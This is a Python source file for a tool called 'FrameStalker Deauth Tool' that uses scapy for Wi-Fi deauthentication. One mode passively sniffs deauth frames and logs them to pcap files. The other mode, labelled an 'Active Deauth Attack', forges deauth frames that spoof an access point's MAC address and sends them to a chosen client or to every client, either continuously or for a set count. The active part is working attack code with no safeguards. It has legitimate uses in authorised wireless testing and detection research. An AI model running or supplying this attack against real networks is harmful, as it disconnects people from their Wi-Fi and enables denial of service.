from scapy.all import *
from datetime import datetime
import time
import subprocess
import re
import os
import sys
from tkinter import Tk, filedialog
from ui.logger import log
from scapy.utils import PcapWriter

def log(msg: str, log_callback=None): #log in gui or print to terminal
    if log_callback:
        log_callback(msg)
    else:
        print(msg)


def validate_mac(mac: str, label: str, log_callback=None) -> bool:

    # Check if MAC is in valid format or is the broadcast address
    if not re.fullmatch(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', mac) and mac.lower() != 'ff:ff:ff:ff:ff:ff':

        # If invalid, log and return False
        log(f"[!] Invalid {label} MAC address: {mac}", log_callback)
        return False
    
    # If valid, return True
    return True

'''
passive sniffing
'''

def sniff_deauth(interface: str, save_dir: str, log_callback=None, stop_event=None):

    timestamp = datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
    pcap_path = os.path.join(save_dir, f"capture_{timestamp}.pcap")
    writer = PcapWriter(pcap_path, append=True, sync=True) #write to pcap file
    passivecount=0
    
    def should_stop(pkt): #function to help threading stop gracefully
    	return stop_event and stop_event.is_set()
    	
    def process_packet(pkt):
        nonlocal passivecount
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 12: # filter for deauth packet specifically 
            pkt.time = time.time() 
            writer.write(pkt) #write to pcap
            src = pkt.addr2
            dst = pkt.addr1
            ts = datetime.now().strftime("%H:%M:%S")
            msg = f"[{ts}] Deauth ⚠️  From: {src} ➔ To: {dst}"
            log(msg, log_callback)
            passivecount += 1
            

    try:
        log(f"[+] Sniffing started on interface: {interface}", log_callback)
        sniff(iface=interface, prn=process_packet, store=False, stop_filter=should_stop)
        

    except Exception as e:
    	log(f"[+] Exception {e}. Saved to {pcap_path}", log_callback)
    finally:
        writer.close()
        log(f"[+] Capture complete. Captured {passivecount} packets. Saved to {pcap_path}", log_callback)


'''
active deauth
'''

#set interface to specified channel
def set_channel(interface: str, channel: int, log_callback=None):
    try:
        subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
        log(f"[+] Interface {interface} set to channel {channel}", log_callback)
    except subprocess.CalledProcessError:
        log(f"[!] Failed to set channel {channel} on {interface}", log_callback)



def send_deauth(interface: str, ap_mac: str, target_mac: str, channel: int, count: int, save_dir: str, log_callback=None, stop_event=None) -> None:
    # Validate MAC addresses and exit if not correct
    if not validate_mac(ap_mac, "AP", log_callback):
        return
    if not validate_mac(target_mac, "Target", log_callback):
        return

    # Set channel
    set_channel(interface, channel, log_callback)

    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    log(f"[+] Launching deauth attack from {ap_mac} ➔ {target_mac} on channel {channel}", log_callback)

    # Set up pcap writer
    timestamp = datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
    pcap_path = os.path.join(save_dir, f"capture_{timestamp}.pcap")
    writer = PcapWriter(pcap_path, append=True, sync=True)
    log(f"[+] Saving active attack packets to {pcap_path}", log_callback)

    def is_deauth(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 12:
            src = pkt.addr2
            dst = pkt.addr1
            ts = datetime.now().strftime("%H:%M:%S")
            msg = f"[{ts}] Deauth ⚠️  From: {src} ➔ To: {dst}"
            log(msg, log_callback)
        return True

    try:
        if count == 0:
            log("[*] Continuous mode enabled. Press Ctrl+C to stop.", log_callback)
            counter = 0
            last_log_time = time.time()
            while not (stop_event and stop_event.is_set()):
                sendp(packet, iface=interface, count=1, inter=0.1, verbose=0)
                if is_deauth(packet):
                    packet.time = time.time() 
                    writer.write(packet)
                counter += 1
                if time.time() - last_log_time >= 1:
                    log(f"[{datetime.now().strftime('%H:%M:%S')}] Packets sent: {counter}", log_callback)
                    last_log_time = time.time()
        else: #Specific number of Deauth packets chosen
            for _ in range(int(count)):
                sendp(packet, iface=interface, count=1, inter=0.1, verbose=0)
                if is_deauth(packet): 
                    packet.time = time.time()
                    writer.write(packet)
            

    except KeyboardInterrupt:
        log("[+] Attack stopped by user.", log_callback)

    except Exception as e:
    	log(f"[+] Exception {e}. Saved to {pcap_path}", log_callback)
    finally:
        writer.close()
        if count == 0: log(f"[+] Attack complete. Sent {counter} packets.", log_callback)
        else : log(f"[+] Attack complete. Sent {count} packets.", log_callback)
        log(f"[+] Capture complete. Saved to {pcap_path}", log_callback)



#CLI
def main():
    args = sys.argv


    '''    
    if cli parameters are given - parse
    '''
    if len(args) >= 3 and args[1] == "passive":
        # CLI mode: passive
        iface = args[2]
        save_dir = args[3] if len(args) > 3 else None
        if not save_dir:
            print("[!] Save directory not provided.")
            sys.exit(1)
        sniff_deauth(iface, save_dir)

    elif len(args) >= 8 and args[1] == "active":
        # CLI mode: active
        iface = args[2]
        ap_mac = args[3]
        target_mac = args[4]
        channel = int(args[5])
        count = int(args[6])
        save_dir = args[7]
        send_deauth(iface, ap_mac, target_mac, channel, count, save_dir)

        '''    
        if cli parameters not given - interactive mode
        '''
    else:

        print("=== FrameStalker Deauth Tool ===")
        print("1. Passive Deauth Frame Sniffing")
        print("2. Active Deauth Attack (Send packets)\n")

        choice = input("Choose mode [1/2]: ").strip()

        if choice == "1":
            iface = input("Enter monitor-mode interface (e.g. wlan0mon): ").strip()

            root = Tk()
            root.withdraw()
            selected_save_dir = filedialog.askdirectory(title="Select folder to save capture files")
            root.destroy()

            if not selected_save_dir:
                print("[!] Capture cancelled. No folder selected.")
                sys.exit(0)

            sniff_deauth(iface, selected_save_dir)

        elif choice == "2":
            iface = input("Enter monitor-mode interface (e.g. wlan0mon): ").strip()
            ap_mac = input("Enter AP MAC address: ").strip()
            target_mac = input("Enter Target MAC (or ff:ff:ff:ff:ff:ff to broadcast): ").strip()

            channel = int(input("Enter channel of the AP (e.g. 1, 6, 36): ").strip())

            try:
                count = input("Enter number of deauth frames to send: (0 = continuous) ").strip()
                count = int(count)
            except ValueError:
                count = 10  # default if error

            root = Tk()
            root.withdraw()
            selected_save_dir = filedialog.askdirectory(title="Select folder to save capture files")
            root.destroy()

            if not selected_save_dir:
                print("[!] Capture cancelled. No folder selected.")
                sys.exit(0)

            send_deauth(iface, ap_mac, target_mac, channel, count, selected_save_dir)

        else:
            print("Invalid choice. Exiting")
            sys.exit(0)


if __name__ == "__main__":
    main()
